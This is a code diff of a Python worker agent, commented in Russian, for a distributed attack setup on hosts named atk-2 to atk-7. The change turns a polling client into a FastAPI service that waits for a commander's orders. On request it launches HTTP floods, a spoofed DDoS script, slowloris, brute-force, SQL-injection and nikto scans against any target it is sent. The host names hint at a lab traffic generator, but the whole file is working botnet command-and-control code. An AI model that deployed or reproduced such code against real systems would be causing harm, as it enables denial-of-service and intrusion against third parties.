@@ -1,114 +1,112 @@
 """
-WORKER AGENT — запускается на atk-2 … atk-7.
-Каждые 2 секунды опрашивает командера, получает текущую атаку и выполняет её.
-Не требует ручного управления — всё управляется через Commander.
+WORKER AGENT — пассивный агент на atk-2…atk-7.
+Просто запускается — никакого COMMANDER_IP не нужно.
+Командер сам добавляет этот узел через веб-интерфейс и толкает команды.
 
-Запуск:
-  COMMANDER_IP=192.168.10.2 python3 agent.py
+API:
+  GET  /status   — текущий статус воркера
+  POST /run      — запустить атаку  {"attack_type": "flood", "target": "1.2.3.4"}
+  POST /stop     — остановить атаку
 """
 
 import os
+import sys
 import time
 import socket
 import subprocess
 import threading
 import logging
-import requests
+from fastapi import FastAPI
+import uvicorn
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [worker] %(message)s")
 logger = logging.getLogger("worker")
 
-COMMANDER_IP   = os.getenv("COMMANDER_IP", "192.168.10.2")
-COMMANDER_PORT = int(os.getenv("CMD_PORT", 5000))
-COMMANDER_URL  = f"http://{COMMANDER_IP}:{COMMANDER_PORT}"
-POLL_INTERVAL  = 2   # секунды
+PORT     = int(os.getenv("WORKER_PORT", 5001))
 
-WORKER_ID = f"worker-{socket.gethostname()}"
-MY_IP     = socket.gethostbyname(socket.gethostname())
+# Путь к скриптам атак — рядом с этим файлом
+_HERE = os.path.dirname(os.path.abspath(__file__))
+A = lambda name: os.path.join(_HERE, "attacks", name)
+app      = FastAPI(title="Attack Worker")
 
-current_proc  = None
+current_proc   = None
 current_attack = None
-lock = threading.Lock()
+current_target = None
+lock           = threading.Lock()
+started_at     = time.time()
 
 
-# ─── Скрипты атак ─────────────────────────────────────────────────────────────
-def get_attack_cmd(attack_type: str, target: str) -> list:
-    cmds = {
-        "flood":     ["ab", "-n", "100000", "-c", "200", "-q", f"http://{target}/"],
-        "ddos":      ["python3", "/app/attacks/ddos_spoof.py", target],
-        "scan":      ["nikto", "-h", f"http://{target}", "-maxtime", "90s", "-quiet"],
-        "brute":     ["python3", "/app/attacks/brute.py", target],
-        "sqli":      ["python3", "/app/attacks/sqli.py", target],
-        "slowloris": ["python3", "/app/attacks/slowloris.py", target],
-        "flash":     ["wrk", "-t4", "-c30", "-d60s", f"http://{target}/"],
-        "slow":      ["wrk", "-t2", "-c15", "-d60s", f"http://{target}/search"],
-    }
-    return cmds.get(attack_type, ["ab", "-n", "10000", "-c", "50", "-q", f"http://{target}/"])
+ATTACKS = {
+    "flood":     lambda t: ["ab", "-n", "500000", "-c", "200", "-q", f"http://{t}/"],
+    "ddos":      lambda t: [sys.executable, A("ddos_spoof.py"), t],
+    "scan":      lambda t: ["nikto", "-h", f"http://{t}", "-maxtime", "90s", "-quiet"],
+    "brute":     lambda t: [sys.executable, A("brute.py"), t],
+    "sqli":      lambda t: [sys.executable, A("sqli.py"), t],
+    "slowloris": lambda t: [sys.executable, A("slowloris.py"), t],
+    "flash":     lambda t: ["wrk", "-t4", "-c30", "-d60s", f"http://{t}/"],
+    "slow":      lambda t: ["wrk", "-t2", "-c15", "-d60s", f"http://{t}/search"],
+}
 
 
-def start_attack(attack_type: str, target: str):
-    global current_proc, current_attack
+def _run(attack_type: str, target: str):
+    global current_proc, current_attack, current_target
     with lock:
         if current_proc and current_proc.poll() is None:
             current_proc.terminate()
             current_proc.wait()
-        cmd = get_attack_cmd(attack_type, target)
-        logger.info(f"Запускаю атаку: {attack_type} → {target}")
+        cmd = ATTACKS.get(attack_type, ATTACKS["flood"])(target)
+        logger.info(f"Запускаю {attack_type} → {target}")
         try:
             current_proc   = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             current_attack = attack_type
+            current_target = target
         except FileNotFoundError as e:
             logger.error(f"Инструмент не найден: {e}")
             current_proc = None
 
 
-def stop_attack():
-    global current_proc, current_attack
+def _stop():
+    global current_proc, current_attack, current_target
     with lock:
         if current_proc and current_proc.poll() is None:
             current_proc.terminate()
             current_proc.wait()
-            logger.info("Атака остановлена")
         current_proc   = None
         current_attack = None
+        current_target = None
 
 
-# ─── Главный цикл ─────────────────────────────────────────────────────────────
-def poll_commander():
-    global current_attack
+@app.get("/status")
+def status():
+    alive = current_proc is not None and current_proc.poll() is None
+    return {
+        "host":           socket.gethostname(),
+        "ip":             socket.gethostbyname(socket.gethostname()),
+        "status":         "attacking" if alive else "idle",
+        "current_attack": current_attack if alive else None,
+        "target":         current_target if alive else None,
+        "uptime":         int(time.time() - started_at),
+    }
 
-    while True:
-        try:
-            status = "attacking" if (current_proc and current_proc.poll() is None) else "idle"
 
-            r = requests.post(
-                f"{COMMANDER_URL}/worker/heartbeat",
-                json={"worker_id": WORKER_ID, "ip": MY_IP, "status": status},
-                timeout=3,
-            )
-            cmd = r.json()
+@app.post("/run")
+def run(body: dict):
+    attack_type = body.get("attack_type", "flood")
+    target      = body.get("target", "")
+    if not target:
+        return {"error": "target required"}
+    threading.Thread(target=_run, args=(attack_type, target), daemon=True).start()
+    return {"status": "started", "attack": attack_type, "target": target}
 
-            attack_active  = cmd.get("attack_active",  False)
-            attack_type    = cmd.get("current_attack", None)
-            target         = cmd.get("target",         "")
 
-            if attack_active and attack_type and target:
-                # Начать атаку если не та или не запущена
-                if attack_type != current_attack or (current_proc and current_proc.poll() is not None):
-                    start_attack(attack_type, target)
-            else:
-                # Атака отменена
-                if current_attack is not None:
-                    stop_attack()
-
-        except requests.exceptions.ConnectionError:
-            logger.warning(f"Командер недоступен ({COMMANDER_URL}), жду...")
-        except Exception as e:
-            logger.error(f"Ошибка: {e}")
-
-        time.sleep(POLL_INTERVAL)
+@app.post("/stop")
+def stop():
+    _stop()
+    return {"status": "stopped"}
 
 
 if __name__ == "__main__":
-    logger.info(f"Worker {WORKER_ID} ({MY_IP}) → командер {COMMANDER_URL}")
-    poll_commander()
+    my_ip = socket.gethostbyname(socket.gethostname())
+    logger.info(f"Worker ready — {my_ip}:{PORT}")
+    logger.info(f"Добавь этот воркер в командер: POST /workers/add {{\"ip\": \"{my_ip}\"}}")
+    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="warning")
